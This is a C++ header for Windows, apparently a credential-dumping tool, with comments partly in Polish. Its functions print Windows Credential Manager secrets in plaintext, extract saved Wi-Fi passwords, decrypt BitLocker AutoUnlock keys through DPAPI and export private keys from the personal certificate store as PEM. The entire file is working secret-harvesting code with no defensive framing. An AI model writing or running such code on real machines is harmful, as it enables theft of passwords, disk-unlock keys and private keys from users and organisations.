#ifndef SYSTEM_CREDENTIALS_DUMP_H
#define SYSTEM_CREDENTIALS_DUMP_H

#include <windows.h>
#include <wincred.h>
#include <wlanapi.h>
#include <wincrypt.h>
#include <ncrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <iomanip>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ncrypt.lib")

#ifndef CERT_NKEY_SPEC
#define CERT_NKEY_SPEC 0xFFFFFFFF
#endif

#ifndef NCRYPT_PKCS8_PRIVATE_KEY_BLOB
#define NCRYPT_PKCS8_PRIVATE_KEY_BLOB L"PKCS8_PRIVATEKEY"
#endif

namespace SystemCredentialsDump {

    // Conversion from std::wstring to std::string (UTF-8)
    inline std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string result(size - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, nullptr, nullptr);
        return result;
    }

    // --- 1. WINDOWS CREDENTIAL MANAGER ---
    // --- 1. WINDOWS CREDENTIAL MANAGER (WITH FULL HEX/ASCII PREVIEW) ---
    inline void PrintHexAndAscii(const BYTE* data, DWORD size) {
        std::cout << "Data (HEX/ASCII): ";
        for (DWORD i = 0; i < size; ++i) {
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)data[i] << " ";
        }
        std::cout << "\nText (ASCII/UTF8): ";
        for (DWORD i = 0; i < size; ++i) {
            char c = (char)data[i];
            if (c >= 32 && c <= 126) {
                std::cout << c;
            } else {
                std::cout << ".";
            }
        }
        std::cout << std::dec << std::endl;
    }

    inline void DumpCredManager() {
        std::cout << "\n=== WINDOWS CREDENTIAL MANAGER ===\n";
        DWORD count = 0;
        PCREDENTIALW* pcredentials = NULL;

        if (CredEnumerateW(NULL, 0, &count, &pcredentials)) {
            std::cout << "Found entries: " << count << std::endl;
            std::cout << "----------------------------------------" << std::endl;

            for (DWORD i = 0; i < count; ++i) {
                PCREDENTIALW cred = pcredentials[i];

                std::wcout << L"Target:        " << (cred->TargetName ? cred->TargetName : L"(none)") << std::endl;
                std::wcout << L"User:          " << (cred->UserName ? cred->UserName : L"(none)") << std::endl;

                if (cred->CredentialBlobSize > 0 && cred->CredentialBlob != NULL) {
                    BYTE* blob = reinterpret_cast<BYTE*>(cred->CredentialBlob);
                    DWORD blobSize = cred->CredentialBlobSize;

                    bool isUtf16 = (blobSize >= 2 && blobSize % 2 == 0);
                    
                    if (isUtf16) {
                        std::wstring secret(reinterpret_cast<wchar_t*>(blob), blobSize / sizeof(wchar_t));
                        std::wcout << L"Password/Token (UTF16): " << secret << std::endl;
                    }

                    PrintHexAndAscii(blob, blobSize);
                } else {
                    std::cout << "Password/Token: (empty)" << std::endl;
                }

                std::cout << "----------------------------------------" << std::endl;
            }

            CredFree(pcredentials);
        } else {
            std::cout << "Enumeration error. Code: " << GetLastError() << std::endl;
        }
    }

    // --- 2. WI-FI PASSWORDS (CONVERSION TO STD::COUT) --- Like Would it hurt to just have on encoding? Windows thinks the other way...
    inline std::wstring GetXmlTagValue(const std::wstring& xml, const std::wstring& startTag, const std::wstring& endTag) {
        size_t start = xml.find(startTag);
        if (start == std::wstring::npos) return L"";
        start += startTag.length();
        
        size_t end = xml.find(endTag, start);
        if (end == std::wstring::npos) return L"";

        return xml.substr(start, end - start);
    }

    inline void DumpWifiPasswords() {
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;
        DWORD dwCurVersion = 0;

        DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS) {
            std::cout << "[!] Failure to open WLAN API. Code: " << dwResult << std::endl;
            return;
        }

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            std::cout << "[!] Filure to load Wi-Fi interfaces." << std::endl;
            WlanCloseHandle(hClient, NULL);
            return;
        }

        std::cout << "\n=== Automatic Wi-Fi passwords extraction ===" << std::endl;

        for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
            PWLAN_INTERFACE_INFO pIfInfo = (PWLAN_INTERFACE_INFO)&pIfList->InterfaceInfo[i];
            PWLAN_PROFILE_INFO_LIST pProfileList = NULL;

            dwResult = WlanGetProfileList(hClient, &pIfInfo->InterfaceGuid, NULL, &pProfileList);
            if (dwResult != ERROR_SUCCESS) continue;

            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                PWLAN_PROFILE_INFO pProfile = (PWLAN_PROFILE_INFO)&pProfileList->ProfileInfo[j];
                
                LPWSTR pstrXml = NULL;
                DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD dwGrantedAccess = 0;

                dwResult = WlanGetProfile(
                    hClient, 
                    &pIfInfo->InterfaceGuid, 
                    pProfile->strProfileName, 
                    NULL, 
                    &pstrXml, 
                    &dwFlags, 
                    &dwGrantedAccess
                );

                if (dwResult == ERROR_SUCCESS && pstrXml != NULL) {
                    std::wstring xmlData(pstrXml);
                    std::wstring keyMaterial = GetXmlTagValue(xmlData, L"<keyMaterial>", L"</keyMaterial>");
                    
                    std::cout << "----------------------------------------" << std::endl;
                    std::cout << "SSID / Profile: " << WStringToString(pProfile->strProfileName) << std::endl;
                    
                    if (!keyMaterial.empty()) {
                        std::cout << "Wi-Fi Password:   " << WStringToString(keyMaterial) << std::endl;
                    } else {
                        std::cout << "Wi-Fi Password:   (Absence or EAP-Enterprise)" << std::endl;
                    }

                    WlanFreeMemory(pstrXml);
                }
            }

            if (pProfileList) WlanFreeMemory(pProfileList);
        }

        if (pIfList) WlanFreeMemory(pIfList);
        WlanCloseHandle(hClient, NULL);
    }

    // --- 3. BITLOCKER AUTOUNLOCK ---
    inline void DecryptBitLockerAutoUnlock() {
        std::cout << "\n=== [ BitLocker AutoUnlock (DPAPI User Scope) ] ===\n";
        HKEY hKey;
        LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\FVEAutoUnlock";

        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            std::cout << "[-] Lack of records of FVEAutoUnlock in registry.\n";
            return;
        }

        WCHAR valueName[16383];
        DWORD valueNameSize, type, dataSize;
        BYTE data[4096];
        DWORD index = 0;
        bool foundAny = false;

        while (true) {
            valueNameSize = 16383;
            dataSize = sizeof(data);

            LONG result = RegEnumValueW(hKey, index++, valueName, &valueNameSize, NULL, &type, data, &dataSize);
            if (result == ERROR_NO_MORE_ITEMS) break;
            if (result != ERROR_SUCCESS || type != REG_BINARY) continue;

            foundAny = true;
            std::cout << "[+] Disk / Volume GUID: " << WStringToString(valueName) << std::endl;
            DATA_BLOB dataIn{ dataSize, data };
            DATA_BLOB dataOut{ 0, NULL };

            if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &dataOut)) {
                std::cout << "    [-] Decrypted key (HEX): ";
                for (DWORD i = 0; i < dataOut.cbData; ++i) {
                    std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)dataOut.pbData[i] << " ";
                }
                std::cout << std::dec << "\n\n";
                LocalFree(dataOut.pbData);
            }
        }
        if (!foundAny) std::cout << "[-] We haven't found any volumes with AutoUnlock.\n";
        RegCloseKey(hKey);
    }

    // --- 4. CERTYFIKATY UŻYTKOWNIKA ---
    inline std::string BytesToPem(const BYTE* data, DWORD size, const std::string& header) {
        DWORD pemLen = 0;
        CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64, NULL, &pemLen);
        std::vector<char> base64(pemLen);
        CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64, base64.data(), &pemLen);

        std::string result = "-----BEGIN " + header + "-----\n";
        result += std::string(base64.data());
        result += "-----END " + header + "-----\n";
        return result;
    }

    inline void ExportPrivateKeyPem(PCCERT_CONTEXT pCertContext) {
        HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKeySpec = 0;
        DWORD dwKeySpec = 0;
        BOOL fCallerFree = FALSE;

        if (!CryptAcquireCertificatePrivateKey(pCertContext, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG, NULL, &hKeySpec, &dwKeySpec, &fCallerFree)) {
            std::cout << "\n    [!] Access Denied to access private key.\n";
            return;
        }

        if (dwKeySpec == CERT_NKEY_SPEC) {
            NCRYPT_KEY_HANDLE hNcryptKey = (NCRYPT_KEY_HANDLE)hKeySpec;
            DWORD dwBlobLen = 0;
            SECURITY_STATUS status = NCryptExportKey(hNcryptKey, (NCRYPT_KEY_HANDLE)NULL, NCRYPT_PKCS8_PRIVATE_KEY_BLOB, NULL, NULL, 0, &dwBlobLen, 0);

            if (status == ERROR_SUCCESS) {
                std::vector<BYTE> keyBlob(dwBlobLen);
                if (NCryptExportKey(hNcryptKey, (NCRYPT_KEY_HANDLE)NULL, NCRYPT_PKCS8_PRIVATE_KEY_BLOB, NULL, keyBlob.data(), dwBlobLen, &dwBlobLen, 0) == ERROR_SUCCESS) {
                    std::cout << "\n--- ODSZYFROWANY KLUCZ PRYWATNY CNG ---\n" << BytesToPem(keyBlob.data(), dwBlobLen, "PRIVATE KEY");
                }
            } else {
                std::cout << "\n    [!] System has forbidden export of CNG key.\n";
            }
            if (fCallerFree) NCryptFreeObject(hNcryptKey);
        } else {
            HCRYPTKEY hKey = (HCRYPTKEY)hKeySpec;
            DWORD dwBlobLen = 0;
            if (CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, NULL, &dwBlobLen)) {
                std::vector<BYTE> keyBlob(dwBlobLen);
                if (CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, keyBlob.data(), &dwBlobLen)) {
                    std::cout << "\n--- DECRYPTED PRIVATE CAPI KEY ---\n" << BytesToPem(keyBlob.data(), dwBlobLen, "RSA PRIVATE KEY");
                }
            } else {
                std::cout << "\n    [!] CAPI key has been blocked before export.\n";
            }
            if (fCallerFree) CryptReleaseContext(hKeySpec, 0);
        }
    }

    inline void DumpEAPCertificates() {
        std::cout << "\n=== STORAGE OF USER'S CERTIFICATES (MY / PERSONAL) ===\n";
        HCERTSTORE hStore = CertOpenSystemStoreW(0, L"MY");
        if (!hStore) return;

        PCCERT_CONTEXT pCert = NULL;
        DWORD count = 0;

        while ((pCert = CertEnumCertificatesInStore(hStore, pCert)) != NULL) {
            count++;
            wchar_t subject[512] = { 0 };
            CertGetNameStringW(pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, subject, 512);

            std::cout << "\n[+] Certificate #" << count << ": " << WStringToString(subject);
            DWORD cbData = 0;
            if (CertGetCertificateContextProperty(pCert, CERT_KEY_PROV_INFO_PROP_ID, NULL, &cbData)) {
                std::cout << "\n    [+] We have found connected private key (DPAPI). Decrypting....";
                ExportPrivateKeyPem(pCert);
            } else {
                std::cout << " (Aebsence of Private Key :( ))\n";
            }
        }
        CertCloseStore(hStore, 0);
    }
}

#endif